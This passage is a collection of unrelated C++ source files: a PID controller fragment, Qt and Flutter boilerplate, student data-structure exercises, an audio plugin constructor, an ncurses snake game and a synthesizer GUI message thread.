100;\t\t\t\t\t\t\t//default Controller Sample Time is 0.1 seconds\n\n    PID::SetControllerDirection(ControllerDirection);\n    PID::SetTunings(Kp, Ki, Kd, POn);\n\n    lastTime = millis()-SampleTime;\n}\n\n/*Constructor (...)*********************************************************\n *    To allow backwards compatability for v1.1, or for people that just want\n *    to use Proportional on Error without explicitly saying so\n ***************************************************************************/\n\nPID::PID(double* Input, double* Output, double* Setpoint,\n        double Kp, double Ki, double Kd, int ControllerDirection)\n    :PID::PID(Input, Output, Setpoint, Kp, Ki, Kd, P_ON_E, ControllerDirection)\n{\n\n}\n\n\n/* Compute() **********************************************************************\n *     This, as they say, is where the magic happens.  this function should be called\n *   every time \"void loop()\" executes.  the function will decide for itself whether a new\n *   pid Output needs to be computed.  returns true when the output is computed,\n *   false when nothing has been done.\n **********************************************************************************/\nbool PID::Compute()\n{\n   if(!inAuto) return false;\n   unsigned long now = millis();\n   unsigned long timeChange = (now - lastTime);\n   if(timeChange>=SampleTime)\n   {\n      /*Compute all the working error variables*/\n      double input = *myInput;\n      double error = *mySetpoint - input;\n      double dInput = (input - lastInput);\n      outputSum+= (ki * error);\n\n      /*Add Proportional on Measurement, if P_ON_M is specified*/\n      if(!pOnE) outputSum-= kp * dInput;\n\n      if(outputSum > outMax) outputSum= outMax;\n      else if(outputSum < outMin) outputSum= outMin;\n\n      /*Add Proportional on Error, if P_ON_E is specified*/\n\t   double output;\n      if(pOnE) output = kp * error;\n      else output = 0;\n\n      /*Compute Rest of PID Output*/\n      output += outputSum - kd * dInput;\n\n\t    if(output > outMax) output = outMax;\n      else if(output < outMin) output = outMin;\n\t    *myOutput = output;\n\n      /*Remember some variables for next time*/\n      lastInput = input;\n      lastTime = now;\n\t    return true;\n   }\n   else return false;\n}\n\n/* SetTunings(...)*************************************************************\n * This function allows the controller's dynamic performance to be adjusted.\n * it's called automatically from the constructor, but tunings can also\n * be adjusted on the fly during normal operation\n ******************************************************************************/\nvoid PID::SetTunings(double Kp, double Ki, double Kd, int POn)\n{\n   if (Kp<0 || Ki<0 || Kd<0) return;\n\n   pOn = POn;\n   pOnE = POn == P_ON_E;\n\n   dispKp = Kp; dispKi = Ki; dispKd = Kd;\n\n   double SampleTimeInSec = ((double)SampleTime)/1000;\n   kp = Kp;\n   ki = Ki * SampleTimeInSec;\n   kd = Kd / SampleTimeInSec;\n\n  if(controllerDirection ==REVERSE)\n   {\n      kp = (0 - kp);\n      ki = (0 - ki);\n      kd = (0 - kd);\n   }\n}\n\n/* SetTunings(...)*************************************************************\n * Set Tunings using the last-rembered POn setting\n ******************************************************************************/\nvoid PID::SetTunings(double Kp, double Ki, double Kd){\n    SetTunings(Kp, Ki, Kd, pOn); \n}\n\n/* SetSampleTime(...) *********************************************************\n * sets the period, in Milliseconds, at which the calculation is performed\n ******************************************************************************/\nvoid PID::SetSampleTime(int NewSampleTime)\n{\n   if (NewSampleTime > 0)\n   {\n      double ratio  = (double)NewSampleTime\n                      / (double)SampleTime;\n      ki *= ratio;\n      kd /= ratio;\n      SampleTime = (unsigned long)NewSampleTime;\n   }\n}\n\n/* SetOutputLimits(...)****************************************************\n *     This functio",
    "#include \"cell.h\"\n#include \"board.h\"\n\n\nCell::Cell(int x,int y, QObject *parent)\n    : QObject{parent},position(x,y)\n{\n    //TODO\n}\n///\n/// \\brief Cell::setPiece \u5b58\u50a8\u65b0\u7684piece\u5230\u8be5\u4f4d\u7f6e\n/// \\param piece\n///\nvoid Cell::setPiece(Piece *piece)\n{\n    if (piece) {\n        piecesHere.push(piece); // \u6dfb\u52a0\u5230\u6808\u9876\n        piece->setPosition(&position); // \u66f4\u65b0Piece\u7684\u5f53\u524d\u4f4d\u7f6e\n    }\n}\n///\n/// \\brief Cell::getPiece \u83b7\u53d6\u7b2c\u4e00\u4e2a\u68cb\u5b50\n/// \\param pop \u662f\u5426\u8981\u5220\u9664\u53d6\u51fa\u7684\u68cb\u5b50\n/// \\return\n///\nPiece *Cell::getPiece(bool pop)\n{\n    /  if (piecesHere.isEmpty()) {\n        return nullptr;\n    }\n\n    // \u5982\u679c pop \u4e3a true\uff0c\u5219\u5f39\u51fa\u6808\u9876\u68cb\u5b50\n    Piece* topPiece = piecesHere.top();\n    if (pop) {\n        piecesHere.pop();  // \u5f39\u51fa\u6808\u9876\u68cb\u5b50\n    }\n    return topPiece;\n}\n///\n/// \\brief Cell::getPiecesNum \u83b7\u53d6\u68cb\u5b50\u6570\u76ee\n/// \\return\n///\nint Cell::getPiecesNum()\n{\n    return piecesHere.size();\n}\n\n///\n/// \\brief Cell::getPosition \u83b7\u53d6\u8be5Cell\u7684Position\u6307\u9488\n/// \\return\n///\nPosition *Cell::getPosition()\n{\n    return &position;\n}\n\nCell *Cell::getAdjacentCell(int i,bool dontCreNewCell)\n{\n    Cell* resCell = adjacentCells[i];\n    if(!resCell)\n    {\n        Position* curPosition = this->getPosition()->getAdjacentPosition(i);\n        resCell = Board::instance->getPositionCell(curPosition,dontCreNewCell);\n\n        this->setAdjacentCell(i,resCell);\n\n        delete curPosition;\n    }\n    return resCell;\n}\n///\n/// \\brief Cell::setAdjacentCell \u8bbe\u7f6e\u4e34\u8fd1Cell\u6570\u7ec4\n/// \\param i\n/// \\param cell\n///\nvoid Cell::setAdjacentCell(int i, Cell *cell)\n{\n    adjacentCells[i] = cell;\n}\n\nbool Cell::checkPieceBelongingHere(int tarBelong)\n{\n    for(auto i : piecesHere)\n    {\n        if(i->belongingPlayer != tarBelong)\n            return false;\n    }\n}\n",
    "//Barnaby Gichana\n//Date. 11.09.2023\n/*Desc. program that creates a 2 dimensional array, populates it with random numbers, then displays the random numbers.\n  The program runs until the user is finished with it.\n*/\n\n#include <iostream>\n#include <ctime>     // For random number generator\n#include <cstdlib>\n#include <iomanip>   // For set width function\n\nusing namespace std;\n\nvoid createArray(int, int, int**);\nvoid displayArray(int, int, int**);\n\nint main(){\n    // Display user insctructions\n    cout << endl;\n    cout << \"Use this program to generate random numbers between 1-100 in table form. Enter the dimensions of your desired table below.\";\n    cout << endl;\n    \n    // Declare\n    int rows;\n    int columns;\n    char restart_option = 'y';\n\n    while (restart_option == 'y' || restart_option == 'Y'){  // Restart loop\n        // Populate\n        cout << \"Enter number of rows: \";\n        cin >> rows;\n        cout << \"Enter number of columns: \";\n        cin >> columns;\n\n        int** two_dimensional_array = new int*[rows];        // Allocate memory for the array of pointers\n        for (int i = 0; i < rows; i++){                      // Allocate memory for each row\n            two_dimensional_array[i] = new int[columns];\n        }\n\n        // Process\n        createArray(rows, columns, two_dimensional_array);\n\n        // Display\n        displayArray(rows, columns, two_dimensional_array);\n\n        // Ask user to restart the program\n        cout << \"\\nWould you like to rerun the program? (Y/N): \";\n        cin >> restart_option;\n        cout << endl;\n    }\n\n    // Thank the user\n    cout << \"Thank you for using this program! :)\" << endl;\n\n    return 0;\n}\n\n//*****************************************************************\n// Function: createArray                                          *\n//*****************************************************************\nvoid createArray(int rows, int columns, int** two_dimensional_array){\n    unsigned seed = time(0);                                    // Seed random number\n    srand(seed);\n\n    for (int i = 0; i < rows; i++){\n        for (int j = 0; j < columns; j++){\n            two_dimensional_array[i][j] = rand() % 100 + 1;\n        }\n    }\n}\n\n//*****************************************************************\n// Function: displayArray                                         *\n//*****************************************************************\nvoid displayArray(int rows, int columns, int** two_dimensional_array){\n    // Display array in table form\n    for (int i = 0; i < rows; i++){\n        for (int j = 0; j < columns; j++){\n            cout << setw(4) << two_dimensional_array[i][j];\n        }\n        cout << endl;\n    }\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"pertemuan6\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"watch_demo\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//Addition at Start \r\n#include<iostream>\r\nusing namespace std; \r\n\r\nclass List\r\n{\r\n    public: \r\n    int data; \r\n    List* next;\r\n    \r\n    // Constructor\r\n    List(int num)\r\n    {\r\n        data = num;\r\n        next = NULL;\r\n    }\r\n};\r\n\r\n// Function to insert a new node at the head\r\nvoid insert_head(List* &head, int data)\r\n{\r\n    List* new_node = new List(data);  // Create a new node\r\n    new_node->next = head;  // Point new node to the current head\r\n    head = new_node;  // Update head to the new node\r\n}\r\n\r\n// Function to display the linked list\r\nvoid display(List* head)\r\n{\r\n    List* temp = head; \r\n    while (temp != NULL)\r\n    {\r\n        cout << temp->data << \" -> \";  // Print data\r\n        temp = temp->next;  // Move to the next node\r\n    }\r\n    cout << \"NULL\" << endl;  // End of list\r\n}\r\n\r\nint main()\r\n{\r\n    List* head = NULL;  // Initialize the head to NULL\r\n    insert_head(head, 30);  // Insert first node\r\n    display(head);  // Display list\r\n    \r\n    insert_head(head, 32);  // Insert second node\r\n    display(head);  // Display list\r\n    \r\n    insert_head(head, 35);  // Insert third node\r\n    display(head);  // Display list\r\n\r\n    return 0;\r\n}\r\n\r\n\r\n/*\r\nOUTPUT: \r\n30 -> NULL\r\n32 -> 30 -> NULL\r\n35 -> 32 -> 30 -> NULL\r\n*/\r\n",
    "/* PdVst v0.0.2 - VST - Pd bridging plugin\n** Copyright (C) 2004 Joseph A. Sarlo\n**\n** This program is free software; you can redistribute it and/orsig\n** modify it under the terms of the GNU General Public License\n** as published by the Free Software Foundation; either version 2\n** of the License, or (at your option) any later version.\n**\n** This program is distributed in the hope that it will be useful,\n** but WITHOUT ANY WARRANTY; without even the implied warranty of\n** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n** GNU General Public License for more details.\n**\n** You should have received a copy of the GNU General Public License\n** along with this program; if not, write to the Free Software\n** Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\n**\n** jsarlo@ucsd.edu\n*/\n\n#define _WIN32_WINDOWS 0x410\n\n#include \"pdvst.hpp\"\n#include <malloc.h>\n#include <process.h>\n#include <windows.h>\n#include <string.h>\n#include <stdlib.h>\n#include <math.h>\n#include <time.h>\n#include <ctype.h>\n#include <sys/stat.h>\n#include <fstream>\n#include <unistd.h>\n\n\n#ifdef _MSC_VER\n#define stat _stat\n#endif\n\nextern HINSTANCE hInstance;\nextern bool globalDebug;\nextern int globalNChannels;\nextern int globalNPrograms;\nextern int globalNParams;\nextern long globalPluginId;\nextern int globalNExternalLibs;\nextern char globalExternalLib[MAXEXTERNS][MAXSTRLEN];\nextern char globalVstParamName[MAXPARAMETERS][MAXSTRLEN];\nextern char globalPluginPath[MAXFILENAMELEN];\nextern char globalVstPluginPath[MAXFILENAMELEN];  // chemin d'acc\u00e8s dans le dossier vst contenant la dll)\nextern char globalPluginName[MAXSTRLEN];\nextern char globalPdFile[MAXFILENAMELEN];\nextern char globalPureDataPath[MAXFILENAMELEN];\nextern char globalHostPdvstPath[MAXFILENAMELEN];\nextern bool globalCustomGui;\nextern int globalCustomGuiWidth;\nextern int globalCustomGuiHeight;\nextern bool globalProgramsAreChunks;\n\nextern bool globalIsASynth;\nextern pdvstProgram globalProgram[MAXPROGRAMS];\n\nint pdvst::referenceCount = 0;\n\n\n   /* change '/' characters to the system's native file separator */\nvoid sys_bashfilename(const char *from, char *to)\n{\n    char c;\n    while ((c = *from++))\n    {\n#ifdef _WIN32\n        if (c == '/') c = '\\\\';\n#endif\n        *to++ = c;\n    }\n    *to = 0;\n}\n    /* change the system's native file separator to '/' characters  */\nvoid sys_unbashfilename(const char *from, char *to)\n{\n    char c;\n    while ((c = *from++))\n    {\n#ifdef _WIN32\n        if (c == '\\\\') c = '/';\n#endif\n        *to++ = c;\n    }\n    *to = 0;\n}\n\n/*\nbool fexists(const char *filename)\n{\n  std::ifstream ifile(filename);\n  return ifile;\n}\n\n*/\n\n\n//-------------------------------------------------------------------------------------------------------\nAudioEffect* createEffectInstance (audioMasterCallback audioMaster)\n{\n\n\treturn new pdvst (audioMaster);\n}\n\npdvst::pdvst(audioMasterCallback audioMaster)\n      :AudioEffectX(audioMaster, globalNPrograms, globalNParams)\n{\n     // set debug output\n    debugFile = fopen(\"pdvstdebug.txt\", \"wt\");\n    // debugFile = NULL;\n\n    // copy global data\n    isASynth = globalIsASynth;\n    customGui = globalCustomGui;\n    customGuiHeight = globalCustomGuiHeight;\n    customGuiWidth = globalCustomGuiWidth;\n    nChannels = globalNChannels;\n    nPrograms = globalNPrograms;\n    nParameters = globalNParams;\n    pluginId = globalPluginId;\n    nExternalLibs = globalNExternalLibs;\n    debugLog(\"name: %s\", globalPluginName);\n    debugLog(\"synth: %d\", globalIsASynth);\n\n    // VST setup\n    setNumInputs(nChannels);\n    setNumOutputs(nChannels);\n    setUniqueID(pluginId);\n    setInitialDelay(PDBLKSIZE * 2);\n    canProcessReplacing();\n    if (isASynth)\n    {\n        isSynth();\n    }\n\n    int i, j;\n\n\n\n    // initialize memory\n    vstParamName = new char*[MAXPARAMETERS];\n    for (i = 0; i < MAXPARAMETERS; i++)\n        vstParamName[i] = new char[MAXSTRLEN];\n    memset(vstParam, 0, MAXPARAMETERS * sizeof(float));\n    program = new pdvstProgram[MAXPROGRAMS];\n\n    for (i = 0; i < nExternalLibs; i++)\n    {\n        strcpy(externalLib[i], globalExternalLib[i]);\n    }\n    debugLog(\"channels: %d\", nChannels);\n    audioBuffer = new pdVstBuffer(nChannels);\n    for (i = 0; i < MAXPARAMETERS; i++)\n    {\n        strcpy(vstParamName[i], globalVstParamName[i]);\n    }\n    strcpy(pluginPath, globalPluginPath);\n    strcpy(vstPluginPath, globalVstPluginPath);\n    strcpy(pluginName, globalPluginName);\n    strcpy(pdFile, globalPdFile);\n    debugLog(\"path: %s\", pluginPath);\n    debugLog(\"nParameters = %d\", nParameters);\n    debugLog(\"nPrograms = %d\", nPrograms);\n    for (i = 0; i < nPrograms; i++)\n    {\n        strcpy(program[i].name, globalProgram[i].name);\n        for (j = 0; j < nParameters; j++)\n        {\n            program[i].paramValue[j] = globalProgram[i].paramValue[j];\n        }\n        debugLog(\"    %s\", program[i].name);\n    }\n    // create editor\n    if (customGui)\n    {\n       editor = new pdvstEditor(this);\n\n        debugLog(\"   -has custom GUI-\");\n  ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"cinetopia\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include<bits/stdc++.h>\nusing namespace std;\n\nclass Queue{\n    private:\n        class node{\n            public:\n                int data;\n                node* next;\n                \n                node(int val)\n                {\n                    data = val;\n                    next = nullptr;\n                }\n        };\n        \n        node* front;\n        node* rear;\n        \n    public: \n        Queue(){\n            front = rear = nullptr;\n        }\n        \n        bool isempty(){\n            return front == nullptr;\n        }\n        \n        void enqueue(int val){\n            node* newnode = new node(val);\n            \n            if(rear == nullptr){\n                front = rear = newnode;\n            }\n            \n            else{\n                rear->next = newnode;\n                rear = newnode;\n            }\n        }\n        \n        void dequeue(){\n            if(isempty()){\n                cout<<\"Queue is empty.\";\n                return;\n            }\n            \n            node* temp = front;\n            cout<< \"dequeued: \" << front->data << endl;\n            front = front->next;\n            \n            if (front == nullptr){\n                rear = nullptr;\n            }\n            delete temp;\n        }\n        void printqueue(){\n            if(isempty())\n            {\n                cout<<\"Queue is empty\"<<endl;\n                return;\n            }\n            \n            node* temp = front;\n            while(temp!=nullptr)\n            {\n                cout<< temp->data<<\" \";\n                temp = temp->next;\n            }\n            cout<<endl;\n        }\n};\n\nint main()\n{\n    Queue q;\n    \n    q.enqueue(10);\n    q.enqueue(12);\n    q.dequeue();\n    q.dequeue();\n    q.printqueue();\n    return 0;\n}",
    "#include<iostream>\n\nusing namespace std;\n\nclass CPrinter\n{\n\tpublic:\n\t\tvoid printArray(string array[], int length);\n\t\tvoid printArray(float array[], int length);\n\t\tvoid printArray(char array[], int length);\n};\n\nint main()\n{\n\tCPrinter printer;\n\tconst int length = 3;\n\t\n\tchar chArray[length] = {'y', 'x' ,'z'};\n\tstring strArray[length] = { \"one\", \"two\", \"three\" };\n\tfloat fArray[length] = {1.2f, 3.1f, 4.6f};\n\n\tprinter.printArray(chArray, length);\n\tprinter.printArray(strArray, length);\n\tprinter.printArray(fArray, length);\n\n\treturn 0;\n}\n\nvoid CPrinter::printArray(string array[], int length)\n{\n\tcout << \"String array: \";\n\tfor (int i = 0; i < length; i++) \n\t{\n\t\tcout << array[i] << \" \";\n\t}\n\tcout << \"\\n\";\n}\n\nvoid CPrinter::printArray(float array[], int length)\n{\n\tcout << \"Float array: \";\n\tfor (int i = 0; i < length; i++)\n\t{\n\t\tcout << array[i] << \" \";\n\t}\n\tcout << \"\\n\";\n}\n\nvoid CPrinter::printArray(char array[], int length)\n{\n\tcout << \"Char array: \";\n\tfor (int i = 0; i < length; i++)\n\t{\n\t\tcout << array[i] << \" \";\n\t}\n\tcout << \"\\n\";\n}",
    "#include <ncurses.h>      // ncurses library\n#include <cstdlib>        // For rand(), srand(), exit()\n#include <ctime>          // For time()\n#include <unistd.h>       // For usleep() (POSIX systems only)\n#include <cstdio>         // For C-style file I/O (fopen, fscanf, fprintf, fclose)\n#include <iostream>       // For standard I/O streams (cin, cout)\n#include <string>         // For string operations\n\n\nusing namespace std;\n\nint width, height;\nint headX, headY, fruitX, fruitY, score;\nbool gameOver;\nint tailX[100], tailY[100];\nint tailLength;\nint highestScore = 0;\n\nFILE *s;\n \nconst char *file = \"highscore.txt\";\n\nvoid getHigh()\n{\n    s = fopen(file, \"r\");\n    fscanf(s, \"%d\", &highestScore);\n    fclose(s);\n}\nvoid writeHigh()\n{\n    s = fopen(file, \"w\");\n    fprintf(s, \"%d\", highestScore);\n    fclose(s);\n}\n\nvoid gotoXY(int x, int y)\n{\n    move(y, x);\n}\n\nenum directions\n{\n    stop = 0,\n    leftss,\n    rightss,\n    up,\n    down\n};\ndirections d;\n\nvoid setup()\n{\n    gameOver = false;\n    d = stop;\n    headX = width / 2;\n    headY = height / 2;\n    srand(time(0));\n\n    do {\n        fruitX = rand() % (width - 1) + 1;\n        fruitY = rand() % (height - 1) + 1;\n    } while (fruitX == headX && fruitY == headY);\n}\n\nvoid draw()\n{\n    clear();\n    start_color();              // Initialize colors\n    init_pair(1, COLOR_RED, COLOR_BLACK); // Snake color\n    init_pair(2, COLOR_GREEN, COLOR_BLACK); // Fruit color\n    init_pair(3, COLOR_WHITE, COLOR_BLACK); // Border color\n    init_pair(4, COLOR_YELLOW, COLOR_BLACK);\n    for (int i = 0; i < width; i++)\n    {\n        for (int j = 0; j < height; j++)\n        {\n            if (i == 0 || j == 0 || i == width - 1 || j == height - 1)\n            {\n                attron(COLOR_PAIR(3));\n                mvprintw(j, i, \"#\");\n                attroff(COLOR_PAIR(3));\n            }\n            else if (i == headX && j == headY)\n            {\n                attron(COLOR_PAIR(1));\n                mvprintw(j, i, \"W\");\n                attroff(COLOR_PAIR(1));\n            }\n            else if (i == fruitX && j == fruitY)\n            {\n                attron(COLOR_PAIR(2));\n                mvprintw(j, i, \"o\");\n                attroff(COLOR_PAIR(2));\n            }\n            else\n            {\n                bool print = false;\n                for (int z = 0; z < tailLength; z++)\n                {\n                    if (tailX[z] == i && tailY[z] == j)\n                    {\n                        attron(COLOR_PAIR(4));\n                        mvprintw(j, i, \"w\");\n                        print = true;\n                        attroff(COLOR_PAIR(4));\n                    }\n                }\n                if (!print)\n                    mvprintw(j, i, \" \");\n            }\n        }\n    }\n    mvprintw(height, 0, \"Current score : %d\", score);\n    mvprintw(height + 1, 0, \"Highest score : %d\", highestScore);\n\n    refresh();\n}\n\nvoid logic()\n{\n    int prevX = tailX[0];\n    int prevY = tailY[0];\n    int prev2X, prev2Y;\n    tailX[0] = headX;\n    tailY[0] = headY;\n    for (int i = 1; i < tailLength; i++)\n    {\n        prev2X = tailX[i];\n        prev2Y = tailY[i];\n        tailX[i] = prevX;\n        tailY[i] = prevY;\n        prevX = prev2X;\n        prevY = prev2Y;\n    }\n\n    switch (d)\n    {\n    case stop:\n        break;\n    case leftss:\n        headX--;\n        break;\n    case rightss:\n        headX++;\n        break;\n    case up:\n        headY--;\n        break;\n    case down:\n        headY++;\n        break;\n    default:\n        break;\n    }\n\n    if (headX >= width || headX <= 0 || headY >= height || headY <= 0)\n        gameOver = true;\n\n    for (int i = 0; i < tailLength; i++)\n    {\n        if (tailX[i] == headX && tailY[i] == headY)\n            gameOver = true;\n    }\n\n    if (headX == fruitX && headY == fruitY)\n    {\n        tailLength++;\n        score++;\n        if (score > highestScore)\n        {\n            highestScore = score;\n        }\n        fruitX = rand() % (width - 3) + 1;\n        fruitY = rand() % (height - 3) + 1;\n    }\n}\n\nvoid input()\n{\n    int ch = getch();\n    switch (ch)\n    {\n    case 'w':\n        d = up;\n        break;\n    case 'a':\n        d = leftss;\n        break;\n    case 'd':\n        d = rightss;\n        break;\n    case 's':\n        d = down;\n        break;\n    case 'e':\n        gameOver = true;\n        break;\n    default:\n        break;\n    }\n}\n\nint main()\n{\n    initscr();\n    clear();\n    noecho();\n    cbreak();\n    timeout(100);\n    keypad(stdscr, TRUE);\n\n    height = 20;\n    width = 30;\n    cout << \"Choose difficulty (1, 2, 3)   :\";\n    int diff;\n    cin >> diff;\n    setup();\n    int timer;\n    // s filename = \"highscore.txt\";\n    getHigh();\n    if (diff == 1)\n    {\n        timer = 100000;\n    }\n    else if (diff == 2)\n    {\n        timer = 50000;\n    }\n    else\n    {\n        timer = 1000;\n    }\n\n    while (!gameOver)\n    {\n        draw();\n        input();\n        logic();\n        usleep(timer);\n    }\n    writeHigh();\n\n    endwin();\n    return 0;\n}\n",
    "/**\n *-----------------------------------------------------------------------------\n * Copyright (c) 2023-2024 Melbourne Instruments, Australia\n *-----------------------------------------------------------------------------\n * @file  gui_msg_thread.cpp\n * @brief GUI Message Thread class implementation.\n *-----------------------------------------------------------------------------\n */\n#include <mqueue.h>\n#include <poll.h>\n#include \"gui_msg_thread.h\"\n\n// Constants\nconstexpr char GUI_MSG_QUEUE_NAME[] = \"/delia_msg_queue\";\nconstexpr uint GUI_MSG_QUEUE_SIZE   = 50;\nconstexpr auto GUI_POLL_TIMEOUT     = 1;\n\n//----------------------------------------------------------------------------\n// GuiMsgThread\n//----------------------------------------------------------------------------\nGuiMsgThread::GuiMsgThread(QObject *parent) : QThread(parent)\n{\n    // Initialise class variables\n    _exit_gui_msgs_thread = false;\n}\n\n//----------------------------------------------------------------------------\n// ~GuiMsgThread\n//----------------------------------------------------------------------------\nGuiMsgThread::~GuiMsgThread()\n{\n    // Stop the thread\n    _exit_gui_msgs_thread = true;\n    wait();\n}\n\n//----------------------------------------------------------------------------\n// run\n//----------------------------------------------------------------------------\nvoid GuiMsgThread::run()\n{\n    mq_attr attr;\n\n    // Open the GUI Message Queue (create if it doesn't exist)\n    std::memset(&attr, 0, sizeof(attr));\n    attr.mq_maxmsg = GUI_MSG_QUEUE_SIZE;\n    attr.mq_msgsize = sizeof(GuiMsg);\n    mqd_t desc = ::mq_open(GUI_MSG_QUEUE_NAME, (O_CREAT|O_RDONLY),\n                           (S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH),\n                           &attr);\n    if (desc == (mqd_t)-1)\n    {\n        // Error opening the GUI Message Queue\n        MSG(\"GuiMsgThread: ERROR: Could not open the GUI message queue: \" << errno);\n        return;\n    }\n\n    // Run until the thread is stopped\n    while(!_exit_gui_msgs_thread)\n    {\n        timespec poll_time;\n        auto msg = GuiMsg();\n\n        // Wait for GUI events, timeout, or an error\n        clock_gettime(CLOCK_REALTIME, &poll_time);\n        poll_time.tv_sec += GUI_POLL_TIMEOUT;        \n        int res = ::mq_timedreceive(desc, (char *)&msg, sizeof(msg), NULL, &poll_time);\n        if (res == sizeof(msg))\n        {\n            // Switch on the message type\n            switch (msg.type) \n            {\n                case GuiMsgType::SET_LEFT_STATUS:\n                    emit left_status_msg(msg.left_status);\n                    break;\n\n                case GuiMsgType::SET_LAYER_STATUS:\n                    emit layer_status_msg(msg.layer_status);\n                    break;\n\n                case GuiMsgType::SET_MIDI_STATUS:\n                    emit midi_status_msg(msg.midi_status);\n                    break;\n\n                case GuiMsgType::SET_TEMPO_STATUS:\n                    emit tempo_status_msg(msg.tempo_status);\n                    break;\n\n                case GuiMsgType::SHOW_HOME_SCREEN:\n                    emit home_screen_msg(msg.home_screen);\n                    break;\n\n                case GuiMsgType::SHOW_LIST_ITEMS:\n                    emit list_items_msg(msg.list_items);\n                    break;\n\n                case GuiMsgType::LIST_SELECT_ITEM:\n                    emit list_select_item_msg(msg.list_select_item);\n                    break;\n\n                case GuiMsgType::SELECT_LAYER_NAME:\n                    emit select_layer_name_msg(msg.select_layer_name);\n                    break;\n\n                case GuiMsgType::SET_SOFT_BUTTONS_TEXT:\n                    emit soft_buttons_text_msg(msg.soft_buttons_text);\n                    break;                \n\n                case GuiMsgType::SET_SOFT_BUTTONS_STATE:\n                    emit soft_buttons_state_msg(msg.soft_buttons_state);\n                    break;\n                \n                case GuiMsgType::SHOW_NORMAL_PARAM:\n                    emit param_update_msg(msg.show_normal_param);\n                    break;\n\n                case GuiMsgType::SHOW_ADSR_ENV_PARAM:\n                    emit show_adsr_envelope_msg(msg.show_adsr_env_param);\n                    break;\n\n                case GuiMsgType::SHOW_VCF_CUTOFF_PARAM:\n                    emit show_vcf_cutoff_msg(msg.show_vcf_cutoff_param);\n                    break;\n\n                case GuiMsgType::SHOW_NORMAL_PARAM_UPDATE:\n                    emit param_value_update_msg(msg.show_normal_param_update);\n                    break;\n\n                case GuiMsgType::SHOW_ENUM_PARAM_UPDATE:\n                    emit enum_param_update_msg(msg.enum_param_update);\n                    break;                  \n\n                case GuiMsgType::SHOW_ENUM_PARAM_UPDATE_VALUE:\n                    emit enum_param_value_update_msg(msg.list_select_item);\n                    break;\n\n                case GuiMsgType::SHOW_EDIT_NAME:\n                    emit edit_n",
